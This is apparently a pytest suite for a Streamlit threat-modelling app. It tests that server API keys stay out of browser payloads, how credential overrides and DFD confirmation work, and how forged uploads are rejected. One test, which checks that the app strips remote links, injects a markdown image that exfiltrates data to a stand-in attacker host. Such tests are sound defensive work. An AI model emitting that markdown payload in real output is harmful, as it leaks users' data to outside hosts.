"""Exercise the real Streamlit application with fake credentials and providers."""

from __future__ import annotations

import base64
import io
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import Mock

import pytest
import streamlit as st
from PIL import Image
from streamlit.testing.v1 import AppTest

from stride_gpt.models import PROVIDERS

APP = Path(__file__).resolve().parents[1] / "apps" / "web" / "main.py"
DFD = "flowchart TD\n Browser-->API"
CLOUD_DFD_PROVIDERS = [
    ("OpenAI API", "OPENAI_API_KEY", "openai_api_key", "get_dfd_openai"),
    ("Anthropic API", "ANTHROPIC_API_KEY", "anthropic_api_key", "get_dfd_anthropic"),
    ("Google AI API", "GOOGLE_API_KEY", "google_api_key", "get_dfd_google"),
    ("Mistral API", "MISTRAL_API_KEY", "mistral_api_key", "get_dfd_mistral"),
    ("Groq API", "GROQ_API_KEY", "groq_api_key", "get_dfd_groq"),
    ("DeepSeek API", "DEEPSEEK_API_KEY", "deepseek_api_key", "get_dfd_deepseek"),
]


@pytest.fixture
def web_app(monkeypatch):
    """No local dotenv or live provider traffic is allowed in UI regressions."""
    monkeypatch.setenv("LITELLM_LOCAL_MODEL_COST_MAP", "True")
    monkeypatch.delenv("GITHUB_API_KEY", raising=False)
    monkeypatch.setattr("dotenv.load_dotenv", lambda *_args, **_kwargs: False)

    def no_live_calls(*_args, **_kwargs):
        pytest.fail("UI test attempted a live provider call")

    monkeypatch.setattr("litellm.completion", no_live_calls)
    monkeypatch.setattr("openai.OpenAI", no_live_calls)
    monkeypatch.setattr("github.Github", no_live_calls)
    return AppTest.from_file(str(APP), default_timeout=20)


def _run(app):
    app.run()
    assert not app.exception
    return app


def _describe(app):
    app.session_state["app_input"] = "A browser calls an API backed by a database."
    app.session_state["_sync_app_desc"] = True
    return _run(app)


def _generate(app):
    next(button for button in app.button if button.label == "Generate DFD").click()
    return _run(app)


def _assert_no_browser_secret(app, *secrets):
    """Inspect the protobufs sent to the browser, not just rendered masking."""
    payloads = b"".join(
        node.proto.SerializeToString()
        for node in app
        if getattr(node, "proto", None) is not None
    )
    for marker in secrets:
        assert marker.encode() not in payloads
        assert marker not in repr(app.session_state.to_dict())


@pytest.mark.parametrize(
    "provider",
    [
        info.provider_key for info in PROVIDERS.values()
        if info.env_var and info.provider_key != "OpenRouter API"
    ],
)
def test_server_credentials_never_enter_browser_payloads(web_app, monkeypatch, provider):
    secrets = []
    for info in PROVIDERS.values():
        if info.env_var:
            marker = f"fake-server-secret-{info.env_var}"
            secrets.append(marker)
            monkeypatch.setenv(info.env_var, marker)
    secrets.append("fake-server-secret-GITHUB_API_KEY")
    monkeypatch.setenv("GITHUB_API_KEY", secrets[-1])

    app = _run(web_app)
    app.selectbox(key="model_provider").select(provider)
    _run(app)

    # Protobuf fields are the actual UI messages serialized to the browser;
    # checking only password-field appearance would miss the original leak.
    _assert_no_browser_secret(app, *secrets)
    assert all(not field.value for field in app.text_input if "API key" in field.label)
    _run(app)
    _assert_no_browser_secret(app, *secrets)


@pytest.mark.parametrize("provider,env_var,state_key,provider_function", CLOUD_DFD_PROVIDERS)
def test_server_key_is_usable_and_user_override_can_be_cleared(
    web_app, monkeypatch, provider, env_var, state_key, provider_function
):
    import dfd

    server_key = f"fake-server-{env_var}"
    monkeypatch.setenv(env_var, server_key)
    generate_dfd = Mock(return_value=DFD)
    monkeypatch.setattr(dfd, provider_function, generate_dfd)
    app = _describe(_run(web_app))
    app.selectbox(key="model_provider").select(provider)
    _run(app)

    _generate(app)
    assert generate_dfd.call_args.args[0] == server_key
    assert app.text_input(key=f"credential_{state_key}").value == ""
    _assert_no_browser_secret(app, server_key)

    app.text_input(key=f"credential_{state_key}").input("fake-user-override")
    _run(app)
    _run(app)
    _generate(app)
    assert generate_dfd.call_args.args[0] == "fake-user-override"
    _assert_no_browser_secret(app, server_key)

    # Streamlit cleans up invisible widgets when switching providers. Keep the
    # user's override without promoting the server fallback into session state.
    other_provider = "Anthropic API" if provider == "OpenAI API" else "OpenAI API"
    app.selectbox(key="model_provider").select(other_provider)
    _run(app)
    app.selectbox(key="model_provider").select(provider)
    _run(app)
    assert app.text_input(key=f"credential_{state_key}").value == "fake-user-override"

    app.text_input(key=f"credential_{state_key}").input("")
    _run(app)
    _generate(app)
    assert generate_dfd.call_args.args[0] == server_key
    _assert_no_browser_secret(app, server_key)


def test_github_token_resolves_server_side_and_override_can_be_cleared(web_app, monkeypatch):
    """Exercise the actual GitHub ingestion path without accessing GitHub."""
    import github
    import tiktoken

    server_key = "fake-server-github-key"
    monkeypatch.setenv("GITHUB_API_KEY", server_key)
    monkeypatch.setenv("STRIDE_GPT_ALLOW_SHARED_GITHUB_TOKEN", "true")
    repository = Mock(default_branch="main")
    repository.get_git_tree.return_value = SimpleNamespace(tree=[])
    repository.get_contents.return_value = SimpleNamespace(
        content=base64.b64encode(b"A simple example project.")
    )
    client = Mock()
    client.get_repo.return_value = repository
    make_client = Mock(return_value=client)
    monkeypatch.setattr(github, "Github", make_client)
    monkeypatch.setattr(
        tiktoken, "encoding_for_model", lambda _model: SimpleNamespace(encode=lambda text: text)
    )
    app = _run(web_app)

    for index, (user_key, expected_key) in enumerate([
        ("", server_key),
        ("fake-user-github-key", "fake-user-github-key"),
        ("", server_key),
    ]):
        app.text_input(key="credential_github_api_key").input(user_key)
        _run(app)
        app.text_input(key="github_url").input(f"https://github.com/example/project-{index}")
        _run(app)
        assert make_client.call_args.args[0] == expected_key
        assert app.text_input(key="credential_github_api_key").value == user_key
        _run(app)
        _assert_no_browser_secret(app, server_key)


def test_lm_studio_user_key_can_be_cleared(web_app, monkeypatch):
    import openai

    make_client = Mock()
    make_client.return_value.models.list.return_value = SimpleNamespace(
        data=[SimpleNamespace(id="local-model")]
    )
    monkeypatch.setattr(openai, "OpenAI", make_client)
    app = _run(web_app)
    app.selectbox(key="model_provider").select("LM Studio Server")
    _run(app)
    app.text_input(key="credential_lm_studio_api_key").input("fake-local-key")
    _run(app)
    assert make_client.call_args.kwargs["api_key"] == "fake-local-key"
    app.text_input(key="credential_lm_studio_api_key").input("")
    _run(app)
    assert app.session_state["lm_studio_api_key"] == ""
    assert make_client.call_args.kwargs["api_key"] == "not-needed"


def test_github_server_token_cannot_be_used_without_opt_in(web_app, monkeypatch):
    monkeypatch.setenv("GITHUB_API_KEY", "fake-server-github-key")
    monkeypatch.delenv("STRIDE_GPT_ALLOW_SHARED_GITHUB_TOKEN", raising=False)
    app = _run(web_app)
    app.text_input(key="github_url").input("https://github.com/example/private")
    _run(app)
    assert any("enter a GitHub API key" in warning.value for warning in app.warning)


def test_generated_dfd_survives_reruns_and_replacement_requires_confirmation(web_app, monkeypatch):
    import dfd

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    provider = Mock(return_value=DFD)
    monkeypatch.setattr(dfd, "get_dfd_openai", provider)
    app = _describe(_run(web_app))

    _generate(app)
    assert provider.call_count == 1
    assert app.text_area(key="dfd_editor").value == DFD
    assert app.session_state["dfd_mermaid"] == DFD
    assert not app.checkbox(key="dfd_confirm_checkbox").value
    _run(app)
    assert app.text_area(key="dfd_editor").value == DFD

    edited = "flowchart TD\n Browser-->Gateway-->API"
    app.text_area(key="dfd_editor").input(edited)
    _run(app)
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)
    assert app.session_state["confirmed_dfd"] == edited
    assert app.session_state["dfd_mermaid"] == edited

    replacement = "flowchart TD\n Client-->Queue"
    provider.return_value = replacement
    _generate(app)
    assert app.text_area(key="dfd_editor").value == replacement
    assert app.session_state["dfd_mermaid"] == replacement
    assert not app.checkbox(key="dfd_confirm_checkbox").value
    assert "confirmed_dfd" not in app.session_state


@pytest.mark.parametrize("edited", ["", "  \n", "flowchart TD\n Browser-->Gateway"])
def test_editing_confirmed_dfd_requires_fresh_confirmation(web_app, monkeypatch, edited):
    import dfd

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    monkeypatch.setattr(dfd, "get_dfd_openai", Mock(return_value=DFD))
    app = _generate(_describe(_run(web_app)))
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)
    assert app.session_state["confirmed_dfd"] == DFD

    app.text_area(key="dfd_editor").input(edited)
    _run(app)
    assert app.session_state["dfd_mermaid"] == edited
    assert "confirmed_dfd" not in app.session_state
    if edited.strip():
        assert not app.checkbox(key="dfd_confirm_checkbox").value
    _run(app)
    assert "confirmed_dfd" not in app.session_state


def test_edit_invalidates_dfd_before_threat_model_generation(web_app, monkeypatch):
    import dfd
    import threat_model

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    monkeypatch.setattr(dfd, "get_dfd_openai", Mock(return_value=DFD))
    provider = Mock(return_value={"threat_model": [], "improvement_suggestions": []})
    monkeypatch.setattr(threat_model, "get_threat_model", provider)
    app = _generate(_describe(_run(web_app)))
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)

    # The Threat Model tab executes before the DFD tab in the app script.
    # A callback must remove stale approval before the next generation starts.
    app.text_area(key="dfd_editor").input("")
    next(button for button in app.button if button.label == "Generate Threat Model").click()
    _run(app)
    assert provider.call_count == 1
    assert DFD not in provider.call_args.args[2]
    assert "confirmed_dfd" not in app.session_state


def test_uploaded_dfd_updates_editor_and_detects_same_name_size_replacement(web_app, monkeypatch):
    import dfd

    monkeypatch.setenv("GOOGLE_API_KEY", "fake-server-google-key")
    parser = Mock(side_effect=[DFD, "flowchart TD\n Client-->Database"])
    monkeypatch.setattr(dfd, "get_dfd_from_image_google", parser)
    app = _run(web_app)
    app.selectbox(key="model_provider").select("Google AI API")
    _run(app)
    original_uploader = st.file_uploader
    current_upload = io.BytesIO()
    Image.new("RGB", (1, 1), "red").save(current_upload, format="PNG")
    current_upload.name = "diagram.png"
    current_upload.type = "image/png"

    def upload(label, *args, **kwargs):
        if kwargs.get("key") == "dfd_image_uploader":
            return current_upload
        return original_uploader(label, *args, **kwargs)

    # AppTest does not implement file-uploader input yet; substitute only its
    # UploadedFile return value, keeping the application parsing flow real.
    monkeypatch.setattr(st, "file_uploader", upload)
    _run(app)
    assert app.text_area(key="dfd_editor").value == DFD
    assert parser.call_count == 1
    _run(app)
    assert parser.call_count == 1
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)
    assert app.session_state["confirmed_dfd"] == DFD

    current_upload = io.BytesIO()
    Image.new("RGB", (1, 1), "blue").save(current_upload, format="PNG")
    current_upload.name = "diagram.png"
    current_upload.type = "image/png"
    _run(app)
    assert parser.call_count == 2
    assert app.text_area(key="dfd_editor").value == "flowchart TD\n Client-->Database"
    assert not app.checkbox(key="dfd_confirm_checkbox").value
    assert "confirmed_dfd" not in app.session_state


def test_model_markdown_cannot_render_remote_images_or_links(web_app):
    app = _run(web_app)
    app.session_state["threat_model_markdown"] = (
        "## Threats\n\n![leak](https://attacker.invalid/image?data=FAKE_SOURCE)\n"
        "[click](https://attacker.invalid/link)"
    )
    _run(app)
    rendered = "\n".join(node.value for node in app.markdown)
    assert "attacker.invalid" not in rendered
    assert "## Threats" in rendered


def test_agentic_description_shows_shadow_scan_autonomy_guidance(web_app):
    app = _run(web_app)
    app.selectbox(key="app_type").select("Agentic AI application")
    app = _run(app)
    assert any(e.label == "Autonomy levels (ShadowScan L0-L5)" for e in app.expander)
    content = "\n".join(m.value for m in app.markdown)
    assert "| L0 | Chatbot |" in content
    assert "| L1 | Copilot |" in content
    assert "| L2 | Supervised |" in content
    assert "| L5 | Fully Autonomous |" in content


@pytest.mark.parametrize("uploader_key", [None, "dfd_image_uploader"])
def test_invalid_diagram_upload_never_reaches_provider(web_app, monkeypatch, uploader_key):
    import dfd
    import threat_model

    monkeypatch.setenv("GOOGLE_API_KEY", "fake-server-key")
    image_provider = Mock()
    dfd_provider = Mock()
    monkeypatch.setattr(threat_model, "get_image_analysis_google", image_provider)
    monkeypatch.setattr(dfd, "get_dfd_from_image_google", dfd_provider)
    app = _run(web_app)
    app.selectbox(key="model_provider").select("Google AI API")
    _run(app)
    original_uploader = st.file_uploader
    uploaded = io.BytesIO(b"forged-upload-not-an-image")
    uploaded.name = "diagram.png"
    uploaded.type = "image/png"

    def upload(label, *args, **kwargs):
        if kwargs.get("key") == uploader_key:
            assert kwargs["max_upload_size"] == 10
            return uploaded
        return original_uploader(label, *args, **kwargs)

    monkeypatch.setattr(st, "file_uploader", upload)
    _run(app)
    image_provider.assert_not_called()
    dfd_provider.assert_not_called()
    assert any("valid PNG or JPEG" in error.value for error in app.error)
